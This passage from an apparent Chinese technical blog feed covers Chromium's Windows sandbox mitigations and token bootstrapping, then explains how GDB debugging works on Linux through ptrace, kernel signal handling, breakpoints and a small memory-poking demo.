class="line"></span><br><span class="line">Strict Handle Checks:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">对于恶意句柄引用立即抛出异常</span><br><span class="line"></span><br><span class="line">Win32k.sys lockdown:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">ProcessSystemCallDisablePolicy 允许从目标过程中选择性禁用系统调用</span><br><span class="line">渲染器进程现在将此设置为DisallowWin32kSystemCalls，这意味着不再允许来自win32k.sys服务的用户模式的调用。这大大减少了渲染器提供的内核攻击面。</span><br><span class="line"></span><br><span class="line">App Container (low box token):</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">在Windows里，这由内核层的一个Low Box Token实现，它是有着限制优先权（通常只有SeChangeNotifyPrivilege和 SeIncreaseWorkingSetPrivilege）的一个剥离版本，运行在低信用等级，这个容器还由一组“能力”实现，它们可以映射到进程允许&#x2F;拒绝做的事情（查看MSDN获取更详细的描述）。从沙箱角度看，最有趣的能力是否决是对网络的访问，如果令牌是Low Box Token，INTERNET_CLIENT能力没有出现的话，就会执行网络检查。</span><br><span class="line">因此沙箱对已有的限制令牌，添加了Low Box相关的属性，并且不授予任何能力，以获得没有来自沙箱化进程的网络访问这样的额外的网络保护。</span><br><span class="line"></span><br><span class="line">Disable Extension Points (legacy hooking):</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">ProcessExtensionPointDisablePolicy</span><br><span class="line">以下注入向量被阻断:</span><br><span class="line">AppInit DLLs Winsock Layered Service Providers (LSPs)</span><br><span class="line">Global Window Hooks (not thread-targeted hooks)</span><br><span class="line">Legacy Input Method Editors (IMEs)</span><br><span class="line"></span><br><span class="line">Control Flow Guard (CFG):</span><br><span class="line">&gt;&#x3D; Win8.1 Update 3 (KB3000850)</span><br><span class="line">CFG通过在编译和链接期间，记录下所有的间接调用信息，并把他们记录在最终的可执行文件中，并且在所有的间接调用之前插入额外的校验，当间接调用的地址被篡改时，会触发一个异常，操作系统介入处理。</span><br><span class="line"></span><br><span class="line">CET Shadow Stack:</span><br><span class="line">Available in Windows 10 2004 December Update.</span><br><span class="line">未在渲染器中启用.</span><br><span class="line"></span><br><span class="line">Disable Font Loading:</span><br><span class="line">&gt;&#x3D; Win10</span><br><span class="line">ProcessFontDisablePolicy</span><br><span class="line"></span><br><span class="line">Disable Loading of Unsigned Code (CIG):</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessSignaturePolicy</span><br><span class="line">防止将未签名代码加载到进程中。这意味着攻击者不能在获得执行权限后加载一个DLL库（其他沙盒缓解措施会起到作用），更重要的是，可以防止第三方DLL注入到我们的进程中，这会影响稳定性和我们启用其他安全缓解措施的能力</span><br><span class="line">为所有沙盒子进程启用.</span><br><span class="line">为沙盒渲染器进程启用（预启动）。这消除了一个进程启动时间间隔，在该时间间隔内，可能会将不正确签名的dll本地注入到呈现程序进程中。</span><br><span class="line"></span><br><span class="line">Disable Image Load from Remote Devices:</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessImageLoadPolicy</span><br><span class="line">E.g. UNC path to network resource.</span><br><span class="line"></span><br><span class="line">Disable Image Load of “mandatory low” (low integrity level):</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessImageLoadPolicy</span><br><span class="line">E.g. temporary internet files.</span><br><span class="line"></span><br><span class="line">Extra Disable Child Process Creation:</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">If the Job level &lt;&#x3D; JOB_LIMITED_USER, set PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY to PROCESS_CREATION_CHILD_PROCESS_RESTRICTED via UpdateProcThreadAttribute().</span><br><span class="line">额外的防御层。提供 job level 可以屏蔽该防御</span><br></pre></td></tr></table></figure><h2 id="Sandbox-policy"><a href="#Sandbox-policy" class="headerlink" title="Sandbox policy"></a>Sandbox policy</h2><p>target 进程的实际限制由 Sandbox policy 进行配置。Sandbox policy 只是一个编程接口，borker 调用它来定义限制和允许。四个功能控制限制，大致对应四个Windows机制：</p><ul><li><code>TargetPolicy::SetTokenLevel()</code></li><li><code>TargetPolicy::SetJobLevel()</code></li><li><code>TargetPolicy::SetIntegrityLevel()</code></li><li><code>TargetPolicy::SetDesktop()</code></li></ul><p>前三个调用使用一个整数级别的参数，该参数从非常strict 到 非常 loose。例如，token 有 7 个 level、job 有 5 个 level，Chromium渲染器通常以四种机制中最严格的级别运行。最后一个（桌面）策略是二进制的，只能用于检测目标是否在备用桌面上运行。</p><h2 id="Target-bootstrapping"><a href="#Target-bootstrapping" class="headerlink" title="Target bootstrapping"></a>Target bootstrapping</h2><p>target 不伴随着限定策略一同执行，它们从一个和常规用户进程 token 非常相似的token开始执行。因为在进程引导过程中，操作系统加载程序需要访问大量资源，其中大部分是未认证且随时会变化的。另外，大部分应用程序使用标准开发工具提供的标准CRT，在进程得到引导后，CRT也需要初始化，这时CRT初始化的内部再次变成未认证状态了。</p><p>在引导阶段，进程实际上使用了两种令牌(token)：</p><ul><li><p>锁定令牌(lockdown token)，即进程令牌</p></li><li><p>初始令牌(initial token)，即设置为初始线程的模拟令牌</p></li></ul><p>事实上，真正的SetTokenLevel定义是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetTokenLevel(TokenLevel initial, TokenLevel lockdown)</span><br></pre></td></tr></table></figure><p>在所有的初始化操作完成后，main()或WinMain()会继续执行，还有两个令牌会存活，但只有初始线程可以使用更强大的那个初始令牌。target的责任是在准备完成后销毁初始令牌。通过调用下面函数实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LowerToken()</span><br></pre></td></tr></table></figure><p>调用完<code>LowerToken()</code>后，target 唯一可用的 token 便是 lockdown token，并且在此之后完整的沙箱限制开始生效。该调用不可撤销。注意，初始令牌是模拟令牌仅对主线程有效，target 进程中创建的其他线程仅使用锁定令牌，因此不会尝试获取符合安全检查的任何系统资源。</p><p>target 始于特权令牌，这简化了explicit policy，因为任何需要在进程启动时执行一次的特权操作都可以在<code>LowerToken()</code>调用之前完成，并且不需要在策略中包含规则。</p><p><strong>NOTE</strong></p><p>确保在调用 <code>LowerToken()</code> 之前关闭使用初始令牌获得的任何敏感操作系统句柄。任何泄露的句柄都可能被恶意软件滥用以逃离沙箱。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox_faq.md">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox_faq.md</a></p><p><a href="https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/design/sandbox.md">https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/design/sandbox.md</a></p><p><a href="https://blog.csdn.net/u011453773/article/details/51162334?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/u011453773/article/details/51162334?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> Sandbox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sandbox </tag>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调试原理小计</title>
      <link href="posts/97908563/"/>
      <url>posts/97908563/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB原理"><a href="#GDB原理" class="headerlink" title="GDB原理"></a>GDB原理</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>linux下gdb调试都是通过ptrace来实现的，通过名字我们就可以看到ptrace是一个用于进程追踪的系统调用，当进程调用了 ptrace 跟踪某个进程之后:</p><ul><li>被跟踪进程的进程状态被标记为 <code>TASK_STOPED</code></li><li>发送给被跟踪子进程的信号 (SIGKILL 除外) 会被转发给父进程, 而子进程会被阻塞</li><li>父进程收到信号后, 可以对子进程进行检查和修改, 然后让子进程继续执行</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;</span><br></pre></td></tr></table></figure><p>其中 <code>request</code> 参数指定了我们要使用 ptrace 的什么功能, 大致可以分为以下几类:</p><ul><li>PTRACE_ATTACH 或 PTRACE_TRACEME 建立进程间的跟踪关系;<ul><li>PTRACE_TRACEME 是被跟踪子进程调用的, 表示让父进程来跟踪自己, 通常是通过 GDB 启动新进程的时候使用;</li><li>PTRACE_ATTACH 是父进程调用 attach 到已经运行的子进程中; 这个命令会有权限的检查, non-root 的进程不能 attach 到 root 进程中;</li></ul></li><li>PTRACE_PEEKTEXT, PTRACE_PEEKDATA, PTRACE_PEEKUSR 等读取子进程内存/寄存器中保留的值;</li><li>PTRACE_POKETEXT, PTRACE_POKEDATA, PTRACE_POKEUSR 等修改被跟踪进程的内存/寄存器;</li><li>PTRACE_CONT，PTRACE_SYSCALL, PTRACE_SINGLESTEP 控制被跟踪进程以何种方式继续运行;<ul><li>PTRACE_SYSCALL 会让被调用进程在每次 进入/退出 系统调用时都触发一次 SIGTRAP; strace 就是通过调用它来实现的, 在每次进入系统调用的时候读取出系统调用参数, 在退出系统调用的时候读取出返回值;</li><li>PTRACE_SINGLESTEP 会在每执行完一条指令后都触发一次 SIGTRAP; GDB 的 nexti, next 命令都是通过它来实现的;</li></ul></li><li>PTRACE_DETACH, PTRACE_KILL 脱离进程间的跟踪关系;<ul><li>当父进程在子进程之前结束时, trace 关系会被自动解除;</li></ul></li></ul><p>参数 pid 表示的是要跟踪进程的 pid, addr 表示要监控的被跟踪子进程的地址.</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>调用 <code>ptrace()</code> 系统函数时会触发调用内核的 <code>sys_ptrace()</code> 函数，由于不同的 CPU 架构有着不同的调试方式，所以 Linux 为每种不同的 CPU 架构实现了不同的 <code>sys_ptrace()</code> 函数，而本文主要介绍的是 <code>X86 CPU</code> 的调试方式，所以 <code>sys_ptrace()</code> 函数所在文件是 <code>linux-2.4.16/arch/i386/kernel/ptrace.c</code>。</p><p><code>sys_ptrace()</code> 函数的主体是一个 <code>switch</code> 语句，会传入的 <code>request</code> 参数不同进行不同的操作，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_ptrace</span><span class="params">(<span class="keyword">long</span> request, <span class="keyword">long</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">dummy</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, ret;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    read_lock(&amp;tasklist_lock);</span><br><span class="line">    child = find_task_by_pid(pid); <span class="comment">// 获取 pid 对应的进程 task_struct 对象</span></span><br><span class="line">    <span class="keyword">if</span> (child)</span><br><span class="line">        get_task_struct(child);</span><br><span class="line">    read_unlock(&amp;tasklist_lock);</span><br><span class="line">    <span class="keyword">if</span> (!child)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request == PTRACE_ATTACH) &#123;</span><br><span class="line">        ret = ptrace_attach(child);</span><br><span class="line">        <span class="keyword">goto</span> out_tsk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (request) &#123;</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKTEXT:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKDATA:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKUSR:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKETEXT:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKEDATA:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKEUSR:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_SYSCALL:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_CONT:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_KILL: </span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_SINGLESTEP:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_DETACH:</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">out_tsk:</span><br><span class="line">    free_task_struct(child);</span><br><span class="line">out:</span><br><span class="line">    unlock_kernel();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以被追踪模式（PTRACE_TRACEME）为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_ptrace</span><span class="params">(<span class="keyword">long</span> request, <span class="keyword">long</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;ptrace &amp; PT_PTRACED)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        current-&gt;ptrace |= PT_PTRACED; <span class="comment">// 标志 PTRACE 状态</span></span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ptrace()</code> 对 <code>PTRACE_TRACEME</code> 的处理就是把当前进程标志为 <code>PTRACE</code> 状态。</p><p>当一个进程被标记为 <code>PTRACE</code> 状态后，调用 <code>exec()</code> 函数去执行一个外部程序时，将会暂停当前进程的运行，并且发送一个 <code>SIGCHLD</code> 给父进程。父进程接收到 <code>SIGCHLD</code> 信号后就可以对被调试的进程进行调试。</p><p>我们来看看 <code>exec()</code> 函数是怎样实现上述功能的，<code>exec()</code> 函数的执行过程为 <code>sys_execve() -&gt; do_execve() -&gt; load_elf_binary()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_elf_binary</span><span class="params">(struct linux_binprm * bprm, struct pt_regs * regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;ptrace &amp; PT_PTRACED)</span><br><span class="line">        send_sig(SIGTRAP, current, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当进程被标记为 <code>PTRACE</code> 状态时，执行 <code>exec()</code> 函数后便会发送一个 <code>SIGTRAP</code> 的信号给当前进程。信号是通过 <code>do_signal()</code> 函数进行处理的，而对 <code>SIGTRAP</code> 信号的处理逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_signal</span><span class="params">(struct pt_regs *regs, <span class="keyword">sigset_t</span> *oldset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> signr;</span><br><span class="line"></span><br><span class="line">        spin_lock_irq(&amp;current-&gt;sigmask_lock);</span><br><span class="line">        signr = dequeue_signal(&amp;current-&gt;blocked, &amp;info);</span><br><span class="line">        spin_unlock_irq(&amp;current-&gt;sigmask_lock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果进程被标记为 PTRACE 状态</span></span><br><span class="line">        <span class="keyword">if</span> ((current-&gt;ptrace &amp; PT_PTRACED) &amp;&amp; signr != SIGKILL) &#123;</span><br><span class="line">            <span class="comment">/* 让调试器运行  */</span></span><br><span class="line">            current-&gt;exit_code = signr;</span><br><span class="line">            current-&gt;state = TASK_STOPPED;   <span class="comment">// 让自己进入停止运行状态</span></span><br><span class="line">            notify_parent(current, SIGCHLD); <span class="comment">// 发送 SIGCHLD 信号给父进程</span></span><br><span class="line">            schedule();                      <span class="comment">// 让出CPU的执行权限</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码主要做了3件事：</p><ol><li>如果当前进程被标记为 PTRACE 状态，那么就使自己进入停止运行状态。</li><li>发送 SIGCHLD 信号给父进程。</li><li>让出 CPU 的执行权限，使 CPU 执行其他进程。</li></ol><p>当父进程（调试进程）接收到 <code>SIGCHLD</code> 信号后，表示被调试进程已经标记为被追踪状态并且停止运行，那么调试进程就可以开始进行调试了</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="断点属性"><a href="#断点属性" class="headerlink" title="断点属性"></a>断点属性</h3><ul><li>是否有条件（由 condition 命令修改）  </li><li>是否有忽略次数 （由 ignore 命令修改）</li><li>是否只针对某个线程有效（由 break 命令的 thread 参数指定）</li><li>是否是临时断点（由 tbreak 命令插入）</li></ul><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>当我们用 GDB 设置断点时, GDB 会把断点处的指令修改成 <code>int 3</code>，同时把断点信息及修改前的指令保存起来. 当被调试子进程运行到断点处时, 便会执行 <code>int 3</code>命令, 从而产生 SIGTRAP 信号. 由于 GDB 已经用 ptrace 和调试进程建立了跟踪关系, 此时的 SIGTRAP 信号会被发送给 GDB, GDB 通过和已有的断点信息做对比 (通过指令位置) 来判断这次 SIGTRAP 是不是一个断点.如果是断点的话, 就回等待用户的输入以做进一步的处理. 如果用户的命令是继续执行的话, GDB 就会先恢复断点处的指令, 然后执行对应的代码.</p><blockquote><p>x86系列处理器从其第一代产品英特尔8086开始就提供了一条专门用来支持调试的指令，即INT  3。简单地说，这条指令的目的就是使CPU中断（break）到调试器，以供调试者对执行现场进行各种分析。当CPU执行到INT 3指令时，由于INT  3指令的设计目的就是中断到调试器，因此，CPU执行这条指令的过程也就是产生断点异常（breakpoint  exception，简称#BP）并转去执行异常处理例程的过程。在跳转到处理例程之前，CPU会保存当前的执行上下文，包括段寄存器、程序指针寄存器等内容。      </p></blockquote><p>上述描述的是软件断点，相应的还有硬件断点</p><blockquote><p>X86系统提供8个调试寄存器（DR0~DR7）和2个MSR用于硬件调试。其中前四个DR0 ~ DR3是硬件断点寄存器，可以放入内存地址或者IO地址，还可以设置为执行、修改等条件。CPU在执行的到这里并满足条件会自动停下来。</p></blockquote><h3 id="断点判断"><a href="#断点判断" class="headerlink" title="断点判断"></a>断点判断</h3><ul><li><p>导致目标程序本次停止运行的信号是不是 SIGTRAP </p></li><li><p>gdb把所有的断点位置都存放在一个链表中，命中判定即把被调试程序当前停止的位置和链表中的断点位置进行比较，看是断点产生的信号，还是无关信号。</p></li><li><p>若断点存在条件，此时条件是否满足</p></li><li><p>断点的忽略次数此时是否为 0 </p></li><li><p>若断点只针对某个线程有效，那么遇到该断点的线程是否就是断 点所设定的线程</p></li></ul><p>若前两个条件之一不满足，则认为目标程序本次是因随机信号而停止。 若后三个条件之一不满足，则认为目标程序本次没有命中断点， gdb 会让其继续运行。</p><h3 id="断点处理"><a href="#断点处理" class="headerlink" title="断点处理"></a>断点处理</h3><p>临时断点：当判定为断点命中之后，若该断 点为临时断点， gdb 就会将这个断点删除。也就是说，临时断点只命 中一次。可能用到临时断点的场合： </p><ul><li><p>用户通过 tbreak 命令显式插入</p></li><li><p>next 、 nexti 、 step 命令需要跨越函数调用的时候，由 gdb 自动 在函数返回地址处插入临时断点 </p></li><li><p>finish 命令需要在当前函数返回地址处插入临时断点</p></li><li><p>带参数的 until 命令需要在当前函数返回地址以及参数指定地址插 入临时断点 </p></li><li><p>在不支持硬件单步的架构上， gdb 需要逐指令插入临时断点来实 现软件单步</p></li></ul><p>gdb 将断点实际插入目标程序的时机：</p><p>当用户通过 break 命令设置一 个断点时，这个断点并不会立即生效，因为 gdb 此时只是在内部的断 点链表中为这个断点新创建了一个节点而已。 gdb 会在用户下次发出 继续目标程序运行的命令时，将所有断点插入目标程序，新设置的断 点到这个时候才会实际存在于目标程序中。与此相呼应，当目标程序 停止时， gdb 会将所有断点暂时从目标程序中清除。 </p><p>断点命中失败的情况下，跨越断点继续运行的过程： </p><ul><li>清除断点 </li><li>单步到断点的下一条指令 </li><li>恢复断点 </li><li>继续目标程序运行</li></ul><h3 id="修改子进程内存"><a href="#修改子进程内存" class="headerlink" title="修改子进程内存"></a>修改子进程内存</h3><p>gdb在调试的时候会修改断点处二进制码为0xcc，我们通过下面的例子来演示父进程如何修改子进程的内存:</p><ul><li>父进程创建子进程, 并先让子进程 sleep 一段时间以保证父进程能更早运行;</li><li>父进程通过 <code>PTRACE_ATTACH</code> 来和子进程建立跟踪关系;</li><li>父进程修改子进程的内存数据;</li><li>父进程通过调用 <code>PTRACE_CONT</code> 让子进程恢复执行;</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW(call) (&#123; int _ret = (int)(call); printf(<span class="meta-string">&quot;%s -&gt; %d\n&quot;</span>, #call, _ret); <span class="meta-keyword">if</span> (_ret &lt; 0) &#123; perror(NULL); &#125;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> changeme[] = <span class="string">&quot;This is  a test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> cdata[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">int64_t</span> data;</span><br><span class="line">    &#125; u = &#123; <span class="string">&quot;Hijacked&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child */</span></span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Children Message: %s\n&quot;</span>, changeme);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* parent */</span></span><br><span class="line">            SHOW(ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">            SHOW(ptrace(PTRACE_POKEDATA, pid, changeme, u.data));</span><br><span class="line">            SHOW(ptrace(PTRACE_CONT, pid, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Parent Message: %s\n&quot;</span>, changeme);</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH, pid, 0, 0) -&gt; 0</span><br><span class="line">ptrace(PTRACE_POKEDATA, pid, changeme, u.data) -&gt; 0</span><br><span class="line">ptrace(PTRACE_CONT, pid, 0, 0) -&gt; 0</span><br><span class="line">Parent Message: This is  a test</span><br><span class="line"></span><br><span class="line">Children Message: Hijacked a test</span><br></pre></td></tr></table></figure><p>可以看出子进程中的字符串已经被修改了, 而父进程中的字符串依旧保持不变.</p><p>在调用 <code>ptrace(PTRACE_POKEDATA, pid, changeme, u.data)</code> 时, 最后一个参数实际上是按照 <code>int64_t</code> 来处理的.</p><h2 id="next"><a href="#next" class="headerlink" title="next"></a>next</h2><ul><li><p>NEXT 命令实现的是 C 代码级的单步。</p></li><li><p>执行 next 命令时， gdb 会计算出当前停止位置的 c 语句的第一条 指令的地址作为 step_range_start ，然后计算出当前停止位置下一 行的 c 语句的第一条指令的地址作为 step_range_end ，随后控制目标程序从当前停止位置开始走指令级单步，直至 pc 超出 step range 为止。</p></li><li><p>next 命令的结束条件： pc &lt; step_range_start || pc &gt;= step_range_end 。 </p></li><li><p>之所以不能简单地判断 pc 是否到达 step_range_end ，是因为 step_range_end 仅仅是 c 源代码意义上的下一行的第一条指令的地址，目标程序实际运行时未必就会到达那里。因此， next 命令的结束条件可以理解为只要 pc 离开当前源代码行即可。</p><p>  <img src= 